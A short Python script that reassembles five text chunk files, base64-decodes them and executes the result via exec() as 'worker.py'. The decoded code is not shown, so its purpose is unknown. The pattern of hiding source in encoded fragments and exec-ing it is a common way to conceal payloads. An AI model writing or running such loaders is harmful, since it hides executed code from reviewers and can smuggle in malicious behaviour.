import base64
from pathlib import Path
_dir = Path(__file__).parent
_b = "".join((_dir / f"wchunk{i}.txt").read_text().strip() for i in range(5))
_src = base64.b64decode(_b).decode("utf-8")
exec(compile(_src, str(_dir / "worker.py"), "exec"), globals())
